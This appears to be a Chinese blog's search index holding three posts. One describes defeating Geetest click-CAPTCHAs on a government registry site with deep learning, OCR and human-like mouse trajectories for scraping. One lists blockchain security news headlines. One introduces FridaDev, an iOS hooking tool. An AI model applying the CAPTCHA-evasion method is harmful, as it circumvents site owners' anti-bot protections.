<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[深度学习识别汉字点选验证码]]></title>
    <url>%2F2019%2F01%2F04%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[背景国家企业信用信息公示系统查询时使用极验验证码，大概率为第三代汉字语序点选识别。 查询资料发现可使用深度学习进行汉字定位及分类。 参考资料： https://runninggump.github.io/2018/11/19/破解含语序问题的点击验证码 https://cos120.github.io/crack/ https://www.cnblogs.com/codefish/p/10104320.html http://www.aneasystone.com/archives/2018/03/python-selenium-geetest-crack.html 实践后效果： 使用的框架、算法及工具： 定位&amp;分类 样本标注：labelImg、若快 训练框架：darknet yolov3 语序识别 百度ocr 结巴分词 百度搜索词频统计 模拟 selenium 滑动轨迹：利用jquery.easing模拟人工轨迹 踩坑汉字定位和分类学习详尽的实践步骤参考资料中都有说明，这里不再叙述。这里记录下实践过程中踩的坑及一些特殊处理。 darknet环境 坑1：不要使用cpu训练 windows/linux推荐使用 AlexeyAB/darknet，专门定制。 VS2017 + VC++2015 v140工具集 CUDA9.0 （坑2： 10.0 在win10 nvidia gtx 1080 ti上报 cuda error:no error，==！答案搜都搜不到，耽搁许久尝试降级才成功） OpenCV 3.4.0 cuDNN7.1 分类样本 坑3：使用手工标注汉字分类样本500张1h后发现刚不住，可使用打码平台，多进程8w张3h搞定。 坑4：分离1.3k汉字训练后验证100张发现准确率同样为85%！无需更多样本分离更多汉字。 坑5：人工打码准确率不能奢望，又花费1h对词频小于10的茫茫多汉字进行修正（脚本在仓库）。 yolo训练 坑6：过拟合！loss稳定即可结束，否则过拟合造成结果失真。 语序识别 发现验证码图片底部会有正确语序 坑7：但多跑几个验证码发现底部汉字会有残缺情况，导致ocr识别少字或错字，增加ocr进行语序识别需修改破解含语序问题的点击验证码中语序识别算法。100张准确率可提升至90%，识别速度大幅降低。 模拟点击 坑8：使用selenium的ActionChains进行模拟点击发现正确点选确定后验证失败，应该是极验进行了轨道判断，需要模拟人工滑动轨迹后点击。从100%失败的直接点击到30%成功的折线轨迹最后进化到99%成功easing轨迹。 重要目录说明1234567darknet jiyan # 定位 jiyan_classify # 分类 python # 破解 gxst # 爬虫 cfg # 配置文件 weights # 权重]]></content>
      <categories>
        <category>Spider</category>
      </categories>
      <tags>
        <tag>Geetest</tag>
        <tag>DeepLearning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Blockchain Security Articles]]></title>
    <url>%2F2019%2F01%2F03%2FBlockchain-Security-Articles%2F</url>
    <content type="text"><![CDATA[环境spider(docker) : scrapy + postgresqlauto(vps) : script(python2markdown &amp; bash2workflow) + travis2hexo New Articles2019-01-03 区块链安全—整数溢出原理分析 EOS竞猜游戏ggeos昨晚遭交易回滚攻击 Old Articles2018-12-29 PeckShield: EOS竞猜游戏LuckBet今晨遭交易回滚攻击 2018-12-28 EOS 回滚攻击手法分析之重放篇 攻击BetDice的黑客团伙再现，竞猜游戏LuckyMe正遭攻击 PeckShield：EOS竞猜游戏GameBet遭受交易回滚攻击 针对Electrum钱包的钓鱼攻击，损失已高达100万美元 以太坊Fountain代币遭溢出攻击 2018-12-26 区块链安全—随机数安全分析（上） EOS 回滚攻击手法分析之黑名单篇 PeckShield：EOS竞猜游戏Lucky Nuts因随机数安全问题暂停 区块链安全—随机数安全分析（下） 2018-12-25 Bitcoin Private（BTCP） 的案例研究 2018-12-24 PeckShield安全播报: EOS竞猜游戏EosDice遭受交易回滚攻击 PeckShield安全播报：EOS竞猜游戏Pickown遭“假转账通知”攻击 PeckShield 安全播报: EOS竞猜游戏LuckBet遭随机数攻击 2018-12-20 EOS DApp 攻击重现之利用黑名单账号进行欺骗攻击 区块链安全—简单函数的危险漏洞分析（一） 2018-12-19 BetDice遭黑客攻击，损失近20万EOS ToBet遭到黑客恶意攻击 Big.game也疑似遭遇黑客攻击 PeckShield安全：EOS竞猜游戏EOS MAX遭黑客攻击，损失55526个EOS PeckShield 安全播报: EOS竞猜游戏TRUSTBET遭黑客攻击，损失11501个EOS 2018-12-18 竞猜类游戏Fastwin遭黑客攻击背后：Block.one官方悄然做了重大更新 区块链安全—合约存储机制安全分析 2018-12-14 公链安全之比特币首个远程DoS漏洞详解(CVE-2010-5137) 2018-12-12 基于EOS的ETH锚定币EETH遭假币攻击，目前接近归零！ PeckShield：今晨多款EOS竞猜类游戏遭黑客交易回滚攻击 2018-12-10 EOS智能合约常见漏洞实践 2018-12-07 Ethereum Smart Contract Audit CheckList 公链安全之亦来云多个远程DoS漏洞详解 2018-12-06 诈骗疯狂敛财！币安刚发布推出去中心化交易平台新闻，就有人仿冒！？ 2018-12-05 EOS竞猜游戏Fastwin遭黑客攻击 损失1929.17个EOS 2018-12-04 VTC币(Vertcoin)遭受51％攻击，造成15次双花 2018-12-03 Bctf Blockchain 两则详解——带你玩转区块链 Dice3D遭攻击后续分析：损失10569个EOS 和EOS.WIN遭受的攻击类似 2018-11-28 PeckShield 安全播报: EOS竞猜类游戏nutsgambling遭黑客交易回滚攻击 2018-11-27 千万下载量开源软件托管给陌生人 植入恶意代码窃取用户密币 区块链安全—详谈合约攻击（五） 黑客向热门 JavaScript 库注入恶意代码 窃取 Copay 钱包的比特币 2018-11-23 团伙利用假充值漏洞非法获取比特币、以太币被批捕 区块链安全—详谈合约攻击（四） 2018-11-22 Gas(矿工费)滥用漏洞的最新披露滥用漏洞的最新披露) 2018-11-21 区块链安全—详谈合约攻击（三） 以太坊EVM动态数组越界导致OOM分析 2018-11-20 区块链安全—详谈合约攻击（二） 区块链安全—详谈合约攻击（一） LCTF2018 ggbank 薅羊毛实战 第三方代发空投平台 AirDropsDAC 的合约私钥泄露导致 HVT token 被盗 介绍如何使用 mythril-classic 查找并利用智能合约中的漏洞 某交易平台系统存在高危漏洞 2018-11-19 条条大路通罗马：实现数字货币双花攻击的多种方法 条条大路通罗马——实现数字货币双花攻击的多种方法 安全监测: 竞猜游戏EOS Lelego疑遭黑客攻击 已暂停运营 2018-11-16 PeckShield安全播报: EOS竞猜游戏LuckyGo遭黑客攻击，损失1029个EOS 区块链安全—详谈共识攻击（四） 以太坊合约审计 CheckList 之变量覆盖问题 2018-11-15 BitcoinCore CVE-2018-17144漏洞研究与分析 2018-11-14 区块链安全—详谈共识攻击（三） 【漏洞预警】警惕矿工费滥用攻击！ 2018-11-13 黑客接管Twitter认证账户，以Elon Musk名义推广虚假加密货币赠品 BCH的51攻击与防守 AurumCoin遭51%攻击，致使Cryptopia交易所损失约1.1万美元 去中心化交易所Newdex混入10亿个EOS假币，损失5.8万美元 EOS BET账户RAM被合约恶意吞噬 BitcoinCore CVE-2018-17144 漏洞研究与分析 2018-11-12 【慢雾情报】 EOS 生态中的另外一个 DApp EOS.WIN也被攻破 【慢雾预警】知名 DApp EOSDice 由于随机数问题再次被黑 HCTF2018 智能合约两则 Writeup 以太坊智能合约审计 CheckList 比特大陆因黑客损失价值550万美元的比特币 2018-11-09 以太坊再现重大漏洞？Netta杨子江表示，若被利用危害程度可能超过“The DAO” 从一起“盗币”事件看以太坊存储 hash 碰撞问题 2018-11-08 EOS智能合约FFgame遭攻击，丢失1331个EOS 2018-11-07 记SECCON 2018的一道智能合约题目 对加密货币交易所gate.io的供应链攻击 技术|“狩零人”威胁攻击分析报告！ 地球OL真实盗币游戏，Web题WriteUp 2018-11-06 地球OL真实盗币游戏，挑战2万大奖！ IBM以区块链驱动的AR游戏系统存在严重缺陷 区块链安全—详谈共识攻击（二） 2018-11-05 Google Play中用于加密登录凭据的“Easy Rates Converter”涉嫌网络钓鱼诈骗 11名黑客窃取价值8万美元的加密货币被捕 交易所漏洞之薅羊毛分析 区块链安全—详谈共识攻击（一） EOS开源游戏EOSDice被盗2545个EOS 2018-10-26 Reddit用户价值约86万美元的加密货币被窃取 区块链安全—分析P2P网络攻击及密码学解决方案 2018-10-23 挖矿攻击之time warp attack 白帽研究人员在网上直播了针对Bitcoin Private的51%攻击 区块链安全—区块链P2P网络详细分析 2018-10-22 报告：加密货币交易所两年内因黑客攻击损失了8.82亿美元 瑞士区块链公司被盗5000万TIO 区块链安全—白话parity多签名合约漏洞 2018-10-19 智能合约逆向初探 区块链的那些事—安全守卫者“哈希函数”的详细分析 2018-10-18 智能合约游戏之殇——Dice2win安全分析 2018-10-17 基于EOS开发的World Conquest被黑客攻击 被盗资金已经转入火币 2018-10-16 区块链的那些事—THE DAO攻击事件源码分析 2018-10-15 区块链的那些事—论激励机制与激励层中的Race-To-Empty攻击 EOS DApp 充值“假通知”漏洞分析 EOSBET遭受溢出攻击，损失巨额EOS DoraHacks区块链安全Hackathon 部分write up by 天枢 EOSBet遭“伪造转账通知”，损失近14万EOS，价值超500万元 黑客攻击成人网站窃取165枚ETH，归还后获奖5000美元 EOS“伪造转账通知”漏洞修复补丁 福利，DVP协助白帽子申请数个CVE！ 2018-10-14 Not a fair game, Dice2win公平性分析 2018-10-13 矿池攻击了解一下 2018-10-12 Not a fair game, Dice2win 公平性分析 2018-10-11 Cobra：由于DDoS攻击Bitcoin.org关闭 剪贴板幽灵：币圈的神偷圣手 双11又又又来了？DVP双重活动，让你成为锦鲤本鲤 BPA出现和通胀漏洞（CVE-2018-17144），黑客超发1900万个BPA并在交易所套现 2018-10-10 TheDAO悲剧重演，SpankChain重入漏洞分析 2018-10-08 黑客用比特币代码漏洞生产出2.35亿个PGN代币，潜在风险或进一步扩大 柚资银行被盗1.8W个EOS 那些被黑客盗取的加密货币 是如何销赃的？ 从 Ethernaut 看以太坊智能合约漏洞（一） 苹果下架 EOSIO Wallet Explorer 数字货币钱包应用：盗取其他用户财产 2018-09-30 利用随机数冲突的ECDSA签名恢复以太坊私钥 某个加密货币交易所的“生钱”漏洞 智能合约自动化审计技术浅析 2018-09-28 管中窥豹，从DVP数据看中心化交易所的安全现状 慢雾安全海贼王：从DApp亡灵军团，细说区块链安全 2018-09-26 Fomo3D 二轮大奖开出，黑客获奖，机制漏洞成游戏没落主因 Crowd Machine团队遭黑客攻击 10亿CMCT被盗 EOS持仓大户被盗EOS目前确认为212万个 一份门罗币“销毁”漏洞的分析报告 2018-09-25 漏洞预警 | CVE-2018-17144：Bitcoin Core通胀漏洞修复 Security Innovation Blockchain CTF writeup Blockchain can be Blocked（比特币网络通讯底层漏洞详解） Blockwell.ai KYC Casper Token “Psoriasis Advertising” Event Analysis 2018-09-21 NEO dBFT 共识机制分析与完善 合约变量的“皇帝新衣” |成都链安漏洞分析连载第九期 ——外部读取状态变量 以太坊合约审计 CheckList 之“以太坊智能合约编码设计问题”影响分析报告 2018-09-20 NEO dBFT共识机制分析与完善 日本加密货币交易所Zaif遭黑客攻击，损失约6000万美元 比特币惊现拒绝服务漏洞，Bitcoin Core开发者已发布紧急修复客户端 etherscan点击劫持漏洞 2018-09-19 DVP已确认众多交易所存在TradingView漏洞，交易所需要立即升级！ 慢雾区： ⼀个通杀绝⼤多数交易平台的 XSS 0day 漏洞 2018-09-17 关于假EOS刷币事件的公告 EOS DApp 已成黑客提款机？慢雾安全团队支招 2018-09-15 数字货币交易平台面临着哪些安全威胁？ 2018-09-14 ERC20事务顺序依赖性问题简要分析 BET被黑客攻击始末，实锤还原作案现场和攻击手段 2018-09-13 blockwell.ai KYC Casper Token “牛皮癣广告” 事件分析 2018-09-11 游戏合约Gorgona存在后门 owner可卷走所有资金 遗忘的亚特兰蒂斯：以太坊短地址攻击详解 DVP社区自治计划1.0出炉，邀你一起构建安全生态 2018-09-06 以太坊合约审计 CheckList 之“以太坊智能合约编码安全问题”影响分析报告 2018-09-05 Chrome扩展MEGA遭到破坏，用户的门罗币可能会被窃取 2018-09-04 谷歌发布了用于探测以太坊区块链的工具 以太坊智能合约 OPCODE 逆向之调试器篇 2018-08-31 迈克菲力挺的Bitfi钱包已承认安全问题 下周公布漏洞奖励方案 2018-08-30 Pandemica庞氏游戏存在Gas超出漏洞，80余万资金遭冻结 2018-08-28 安全状况、风险详情将透明 DVP平台推出安全红黑榜 2018-08-27 Atlas Quantum加密货币投资平台遭遇数据泄露 Scavenging Attacks in “Post-Smuggling Era” 2018-08-25 God.Game 智能合约攻击事件分析 以太坊智能合约多个攻击案例分析 2018-08-24 Last Winner的最后赢家：智能合约超大规模黑客攻击手法曝光 God.Game 漏洞复盘：跑路还是黑客攻击？ 智能合约游戏之殇——类 Fomo3D 攻击分析 智能合约游戏之殇——GodGame 事件分析 2018-08-23 游戏skr而止，漏洞周而复始 | 成都链安漏洞分析连载第六期 —— 游戏合约漏洞全面汇总 Fomo3D 千万大奖获得者“特殊攻击技巧”最全揭露 GodGame漏洞原理以及黑客攻击手法分析 Fomo3D，被黑客拿走的2200万 白帽汇安全研究院：部分区块链厂商安全意识薄弱 2018-08-22 游戏平台God.Game称遭黑客攻击，智能合约中以太坊总量归零 安比实验室：Fomo3D胜者采取“特殊技巧”加速游戏结束并提高胜率 以太坊合约审计 CheckList 之“以太坊智能合约设计缺陷问题”影响分析报告 SABRE保护比特币免受路由攻击(Paper) BitMEX交易所遭遇DDOS，目前已经恢复 2018-08-20 以太坊 “后偷渡时代” 盗币之 “拾荒攻击” 2018-08-19 neo智能合约平台Runtime_Serialize调用拒绝服务漏洞 2018-08-18 一种利用 etherscan.io 缺陷的智能合约蜜罐 “Ethereum Smart Contract Specification Issue” Impact Analysis 智能合约史上最大规模攻击手法曝光，盘点黑客团伙作案细节 一种针对类 Fomo3D 游戏空投的高级攻击技术剖析 2018-08-17 1200W人民币被盗！区块链游戏Last Winner疑点重重 2018-08-16 数字加密货币交易软件APT攻击简报 以太坊智能合约重放攻击细节剖析 以太坊合约审计 CheckList 之“以太坊智能合约规范问题”影响分析报告 2018-08-14 深入解析新型加密货币挖矿恶意软件ZombieBoy 2018-08-13 超100家交易所高危漏洞导致50亿价值数字资产受威胁 2018-08-10 从solidity语言特性深度解读以太坊智能合约漏洞原理和攻击利用 EOS 官方 API 中 Asset 结构体的乘法运算溢出漏洞描述 2018-08-09 白帽黑客发现以太坊DApp Augur的主要漏洞 2018-08-07 金钱难寐，大盗独行 | 以太坊JSON-RPC接口多种盗币手法大揭秘 看Hidden Bee如何利用新型漏洞进行传播 2018上半年区块链安全报告 2018-08-03 私钥丢失也能找回以太币？ 门罗币假充值漏洞导致Altex交易所遭受重大损失 SIM token 自动化薅羊毛攻击还原 2018-08-02 警惕！EOS恶意合约可吞噬用户RAM漏洞分析 2018-08-01 金钱难寐，大盗独行——以太坊 JSON-RPC 接口多种盗币手法大揭秘 2018-07-30 以太坊智能合约中随机数预测 2018-07-29 分析一个有趣的蜜罐合约 2018-07-27 区块链安全技术总结 去中心化交易所Waves DEX周二遭受攻击，现已恢复 2018-07-26 修饰器（modifier）相关漏洞分析 2018-07-25 构造函数缺失漏洞分析 警惕 | 恶意EOS合约存在吞噬用户RAM的安全风险 【EOS Fomo3D你千万别玩】狼人杀遭到溢出攻击, 已经凉凉 震惊！利好变利空，烧币也能作假！ Fomo3D山寨版原来是这样留后门的 EOS 安全问题紧急情报通知：警惕 EOS 恶意合约吞噬用户 RAM Solidity中的delegatecall杂谈 2018-07-24 ERC20不一致性检查（新增balnaces不一致检查漏洞） 直布罗陀区块链交易所RKT存在上溢漏洞 Fomo3D“薅羊毛”攻击揭秘：通过重复的创建预先计算好地址的合约来赢取空投奖金！ 2018-07-23 比特币黑客攻击手段全揭秘 ANNI Token智能合约安全审计报告分析 直布罗陀区块链交易所RKT 存在上溢漏洞 首个区块链 token 的自动化薅羊毛攻击分析 2018-07-22 几乎所有钱包都有致命漏洞，黑客接触手机2分钟，就能转走币 2018-07-21 从一道CTF题看智能合约的安全问题 2018-07-20 Parity多重签名合约Delegatecall漏洞回顾 慎用 EOS 第三方开源 SDK 2018-07-19 CertiK：一款智能合约的代码审计平台 Parity多重签名函数库自杀漏洞 首个区块链token的自动化薅羊毛攻击分析 2018-07-18 EOS被盗事件频起，这里有一份安全攻略可以借鉴 一种新型的constructor函数使用漏洞，可导致合约权限丢失、代币增发 2018-07-17 LightCoin合约非一致性检查漏洞分析 安恒风暴中心助力编著区块链安全产业全生命周期整体解决方案 2018-07-16 黑产军团控制四百万肉鸡集群，掘金区块链数字货币 知名比特币网站bustabit价值$12,000的点击劫持、XSS以及拒绝服务漏洞详情揭秘 EOS 假账号安全风险预警 2018-07-14 EIP827安全事件跟踪 2018-07-12 “tradeRifle”漏洞再曝交易所安全风险——LBank交易所移动终端可被中间人攻击提取数字资产 以太坊网络架构解析 2018-07-11 浅析AMR智能合约批量转账溢出漏洞 一些EOS账户使用弱助记词生成EOS私钥，存在高危风险 以太坊智能合约OPCODE逆向之理论基础篇 2018-07-10 Microsoft Azure 以太坊节点控制面板存在未授权访问漏洞 交易所EXX称遭黑客频繁攻击 空手套白狼？USDT 假充值逻辑缺陷漏洞利用分析 Bancor交易所被入侵事件解析 2018-07-09 EDU&amp;BAI任意转走账户Token事件回顾 以太坊代币“假充值”漏洞预警分析 研究人员：去年每一次的ICO平均有五个漏洞 2018-07-05 火币网场外交易存在安全漏洞 2018-07-04 云储币Siacoin交易管理系统Siaberry的几个漏洞 solidity中的继承杂谈 Steem发布补丁，修复停滞漏洞 2018-07-03 研究称：“挖矿劫持”超越勒索软件，成为首要安全威胁 恶意软件“剪贴板劫持者”正监控230万个比特币地址 微信支付的JAVA SDK存在漏洞，各大交易所需尽快自检 2018-07-02 Trezor钱包遭遇BGP劫持，警惕钓鱼网站 2018-06-29 以太坊JSON-RPC出现新的攻击方式，开放API并解锁过的账户可能已被种下“后门” 2018-06-28 EPoD: 以太坊Geth客户端拒绝服务漏洞 (CVE-2018-12018) 部分交易所对USDT币充值存在校验缺陷，可通过“假充值”导致市场混乱！ 2018-06-27 区块链黑幕 | 我们不生产“白皮书”，我们只是“白皮书”的搬运工！ HDAC矿池遭受黑客攻击 EOS智能合约的一些问题总结和建议 嗨池称日前遭黑客攻击，将永久关闭 Solidity 安全：已知攻击方法和常见防御模式综合列表 神秘组织BitPico宣布对BCH发动51%攻击 以太坊 Solidity 合约 call 函数簇滥用导致的安全风险 2018-06-26 Solidity中存储方式错误使用所导致的变量覆盖 以太坊蜜罐智能合约分析 利用网游加速器隧道传播挖矿蠕虫事件分析报告 从以太坊”MorphToken事件”看智能合约构造函数大小写编码错误漏洞 2018-06-25 bkex.com 疑似被入侵 平台用户名密码疑似已泄露 ERC223及ERC827实现代码欠缺安全考虑 —— ATN Token中的CUSTOM_CALL漏洞深入分析 2018-06-23 Mt.Gox暂停破产,17万枚比特币将退还客户和债主 以太坊去中心化应用dApp的渗透测试姿势浅析 2018-06-22 以太坊智能合约 Owner 相关 CVE 漏洞分析 2018-06-21 加密货币2018大事记 | 你来偷，他来抢，币圈是否真的无宁日？ ERC20 智能合约整数溢出系列漏洞披露 以太坊智能合约call注入攻击 2018-06-20 韩国最大虚拟货币交易平台被黑，价值2亿人民币资产失窃 ERC223智能合约ATN币出现owner权限窃取漏洞 ATN 抵御合约攻击的报告——基于ERC223与DS-AUTH的混合漏洞 2018-06-19 YEED代币存在任意关停交易漏洞 LCX币出现被可任意远程关停交易漏洞 CVE-2018-12018:以太坊存在DDOS漏洞，可致60%节点下线 2018-06-15 Syndicate钱包遭黑客攻击价值1000万美元的货币被盗 谈谈ERC20涉及面最广重大漏洞之我见 仅需500美元，你也可以完成一次51%双花攻击 智能合约再现漏洞 SNC虚拟货币存在可无限增发情况 2018-06-13 智能合约RemiCoin再爆任意转账漏洞 ERC20 Token智能合约FuturXe存在任意转账漏洞 2018-06-12 谈谈智能合约中的中心化威胁 2018-06-11 韩国加密货币交易所Coinrail遭黑客入侵，黑客盗走了价值4000万美元的ICO代币 imToken遭黑客入侵:Amazon AWS 密码泄露 2018-06-08 ERC20代币Soarcoin (SOAR) 存在后门，合约所有者可任意转移他人代币 2018-06-07 缺少返回值错误 - 至少130个令牌受到影响 2018-06-06 AACOIN平台出现BUG可无限冲币 以太坊parity客户端存在潜在的共识问题 2018-06-05 Block.one被黑客入侵，投资者价值数百万美元的代币被骗 通俗易懂谈BEC智能合约致命漏洞 区块链入门漫谈 2018-06-04 EOS节点远程代码执行漏洞：EOS智能合约WASM函数表数组越界分析 ZenCash遭受51％的攻击，因双重支出55万美元 如何渗透测试以太坊 dApps 2018-05-31 区块链智能合约漏洞，想说补你不容易 浅谈最近流行的三起区块链51%算力攻击 KoreaShow（Ethereum ERC20令牌）的智能合约实施的transferMulti函数中的整数溢出允许攻击者通过制作的_value参数完成未经授权的数字资产增加。 EduCoin智能合约transferFrom任意转账漏洞 2018-05-30 MEWKit： Cryptotheft 的最新武器 黑客从加密货币交易应用Taylor中盗取135万美元 EOS存在P2P拒绝服务漏洞 2018-05-29 区块链史诗级漏洞 可完全控制虚拟货币交易 360 | 数字货币钱包APP安全威胁概况 2018-05-28 加密货币交易平台Taylor遭黑客攻击：被盗2500余个ETH 蚂蚁矿机多款型号存在远程命令执行漏洞（CVE-2018-11220） EOSIO社区的多名成员在5月27日收到了一封钓鱼邮件 以太坊智能合约安全入门了解一下（下） GATE交易所遭黑客攻击，RLC瞬间爆拉百倍 2018-05-26 360 | 数字货币钱包安全白皮书 2018-05-25 基于区块链域名的僵尸网络病毒分析 2018-05-24 以太坊erc20智能合约任意转账漏洞分析 BTG(bitcoin gold)受到51%攻击，攻击者利用双重支付获利 2018-05-22 恶意软件伪装成Cloudflare页面默默挖矿 黑客正在利用Claymore矿机漏洞进行大范围的扫描和攻击 日本加密货币Monacoin受自私采矿攻击攻击 以太坊区块链游戏Ether Cartel存在越权调用漏洞并已被野外利用，合约所有人可被攻击者篡改。 2017年假冒ICO使澳大利亚累计损失约3.4亿澳元 OKEX疑似出现重大bug导致钱生钱 XVG币再次遭受51%算力攻击 2018-05-19 以太坊智能合约 Hexagon 存在溢出漏洞 部分NEP-5代币存在存储区注入漏洞 2018-05-18 【漏洞预警】挖矿软件Claymore Dual Miner远程命令执行漏洞（CVE-2018-1000049） 以太坊智能合约安全 Dasp Top10 以太坊智能合约Hexagon存在溢出漏洞 2018-05-17 Cryptojacking攻击击中数百个网站挖掘Monero 以太坊智能合约安全入门了解一下（上） 2018-05-15 攻击者可以在ROC（Rasputin Online Coin）令牌智能合约（CVE-2018-10944）中窃取所有以太币 2018-05-14 伪造微软等企业签名，恶性病毒窃取比特币疯狂挖矿 2018-05-12 以太坊钱包出现价值两百万的钓鱼陷阱 2018-05-11 GhostMiner解析：无文件挖矿的新姿势 CVE-2018-10706：ERC20令牌SCA存在整数溢出漏洞，可导致攻击者获得大量代币 最近出现了一种新型使用无文件技术的恶意挖矿软件：GhostMiner 西安警方破获假借区块链之名进行网络传销案件 2018-05-10 比特币现金挖矿节点修复可能导致网络分裂漏洞 2018-05-09 以太坊Parity钱包 multi-sig库被人越权销毁，导致大量资金冻结 史上最能穷折腾的挖矿木马“520Miner”：控制数千台机器挖矿，却一毛钱都没挣到 CVE-2018-10705：ERC20令牌AURA存在越权调用漏洞，可导致攻击者获得合约所有权 USDT 发行方 Tether 遭受黑客攻击事件 CVE-2018-10666：ERC20令牌IDXM存在越权调用漏洞，可导致攻击者获得合约所有权 攻击者如何在Bancor交易所中实施先行攻击 2018-05-07 为什么区块链并不总是问题的答案？ 2018-05-04 在私有以太坊上实现针对ERC20数字货币ProxyOverflow漏洞的攻击 极验Geetest | 区块链项目落地后，有哪些坑你不该踩？ 黑客伪造算力盗取多种数字货币 SMT整型溢出漏洞分析笔记 2018-05-03 由一道CTF题引发的区块链“股权纠纷案” 2018-05-02 黑客从比特币矿池中窃取83,000美元 2018-05-01 SMT智能合约整型溢出漏洞 2018-04-28 黑客伪造算力从矿池种盗取多种数字货币 2018-04-25 黑客两小时卷走13000美金，MyEtherWallet DNS劫持事件深度分析 BeautyChain（BEC）智能合约中出现了一个灾难性的漏洞（整形溢出漏洞） 以太坊钱包 Myetherwallet 遭 DNS 劫持 2018-04-23 韩国比特币交易所Yapizon被盗3831 BTC，用户将平摊所有损失 交易所BitGrail被攻击，大量XRB被黑客窃取 币安交易所用户权限被盗 一行代码蒸发了¥6,447,277,680 人民币！ GHash.io矿池对赌博网站BetCoin Dice进行多次付款欺诈，实施双重支出攻击. Blockchain.info 因被 DDoS 攻击服务临时下线 Eligius矿池遭受“块代扣攻击” AntPool，BW.com，NiceHash，CKPool和GHash.io等矿池遭DDOS攻击 BitcoinTalk论坛遭社会工程学攻击 CoinDash项目ICO众筹地址遭到黑客篡改 比特币黄金网站遭遇DDOS攻击 斯洛文尼亚加密挖矿网站Nicehash比特币被盗 数字代币初创公司Tether宣布自己的系统遭遇黑客袭击 通过劫持在线钱包BlackWallet的DNS服务器，黑客窃取40万美金 利用Google Adwords污染搜索结果Coinhoarder钓鱼事件 比特币服务提供商Purse因其电子邮件服务提供商之一已经被入侵，用户资金遭窃 黑客仅通过使用电话号码盗取用户大量比特币 交易所OKEx数位用户平台账号被窃取 CryptoShuffler木马从受害者的钱包中偷走了160,000美元的比特币 Bitcoin gold遭钱包骗局，用户导入数百万美元比特币却不翼而飞 IOTA社区大量用户钱包代币被窃取 有人在twitter上冒充知名人士如Vitalik Buterin诈骗数字货币 印度女子与骗子共享证书，比特币被盗 交易所Cryptsy被攻击，黑客从Cryptsy的“安全/冷钱包”转账比特币和莱特币以及其他更小型的加密币 比特币交易平台BitQuick服务器遭攻击 ShapeShift丢失23万美元数字货币，“内鬼”将安全信息出售给黑客 香港数字货币交易所Gatecoin遭黑客攻击 交易所Bitfinex遭黑客攻击 韩国最大交易所Bithumb三万用户信息被泄露 韩国数字货币交易所Youbite受到黑客入侵，造成的损失相当于平台内总资产的17% 日本最大的比特币交易所之一Coincheck遭黑客攻击 基于以太坊的数字货币Krypton遭受来自一个名为“51% Crew”的组织的51%攻击 比特币网络遭遇垃圾交易攻击 在线黑市Silk Road 2遭遇交易延展性攻击，比特币被盗 Parity客户端附带的多重签名钱包智能合约被发现存在严重漏洞，攻击者可以立即接管钱包并吸收所有资金 运行在以太坊公有链上的The DAO智能合约遭遇攻击 印度比特币交易所Coinsecure公司钱包遭窃取 虚拟货币 Verge(XVG)，遭到攻击 迪拜某加密货币交易所员工窃取20万美元的加密货币供个人使用 火币网遭到DDOS攻击 Mt.Gox（Magic: The Gathering Online Exchange）因安全漏洞被黑，泄露大量数据 世界第三大比特币交易中心Bitomat部分wallet.dat访问权限丢失 作为常用比特币交易的处理中心之一的MyBitcoin宣布遭到黑客攻击，并导致其关闭 由于网站托管供应商Linode的服务器超级管理密码泄露，Bitcoinica交易平台钱包内比特币被黑客窃取 2012年，Bitcoinica两度遭到黑客攻击 Bitcoin Savings and Trust被所有者关闭 Bitfloor交易中心也被黑客入侵，Bitfloor因此暂停运营 澳大利亚Tradefortress比特币银行被盗 波兰比特币交易平台Bidextreme.pl遭受黑客攻击 曾经世界第一的日本交易所Mt.Gox，导致其最终被迫宣布破产 美国数字货币交易所Poloniex被盗 BTC-E比特币交易平台遭受强大的DDOS攻击 交易所LocalBitcoins遭受拒绝服务漏洞攻击 BitPay CEO遭网络钓鱼，资金被骗 国内山寨币交易平台比特儿遭到黑客攻击 全球知名的数字货币交易所Bitstamp系统管理员被诱导执行恶意文件 2018-04-20 新华社：区块链如何带来个人数据保护“革命” 2018-04-13 渗透思路 | 加密货币矿工和信用卡信息泄露 2018-04-10 区块链应用在网络安全的六个案例 2018-04-07 利用树莓派探索以太坊第一部分：环境搭建 2018-03-25 3月25日安全热点 - Facebook从用户的智能手机收集电话和短信数据 2018-03-21 如何使用Go语言编写自己的区块链挖矿算法 揭秘以太坊中潜伏多年的“偷渡”漏洞，全球黑客正在疯狂偷币 2018-03-16 为什么区块链最终可能会以侵蚀你的网络隐私而告终？ 2018-03-12 区块链安全 - DAO攻击事件解析 区块链安全 - 以太坊短地址攻击 2018-02-05 区块链安全技术：企业应用区块链技术时如何考量？ 2018-01-25 区块链跨域安全解决方案 2018-01-24 360CERT——区块链技术安全讨论 区块链技术安全讨论 2017-06-12 区块链技术的安全价值与局限性解析 2016-10-12 浅析互联网后最具颠覆性创新技术——区块链安全 2016-06-09 微软欲打造基于“区块链”技术的身份识别系统]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS Hook FridaDev]]></title>
    <url>%2F2018%2F11%2F30%2FiOS-Hook-FridaDev%2F</url>
    <content type="text"><![CDATA[FridaDev作为大自然的搬运工和组装师傅，收集并增强一些非常有用的frida脚本封装为FridaDev工具，可以实现一键式逆向需求，提高生产力。 脚本来源： https://github.com/0xdea/frida-scripts https://github.com/AloneMonkey/iOSREBook/tree/master/chapter-7/7.3%20Frida%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8/Frida 修改： 动态hook ui增加打印controller和action 根据稳定性trace选择spwan，其他功能选择attach 仓库直通车：https://github.com/houugen/FridaDev 功能1234567891011121314151617usage: fridaDev.py [-h] [-l] [-i] [-u appName] [-d appName] [-t identifier] [-e identifier]frida toolsoptional arguments: -h, --help show this help message and exit -l, --list list running processes -i, --info list installed app infomation -u appName, --ui appName show UI (only for ios) -d appName, --dynhook appName dynamic hook -t identifier, --trace identifier ObjC/java and Module tracer -e identifier, --enumerate identifier Collection of functions to enumerate classes and list功能：列出运行进程名及pid 使用（支持grep）：./fridaDev.py -l (| grep xxx) 123456789[*] Device info: Device(id=&quot;83ae210b1d153c611e268b45b54e5f77d575212b&quot;, name=&quot;iPhone&quot;, type=&apos;usb&apos;)pid name0 launchd1 launchd179 amfid346 jailbreakd491 wifid... 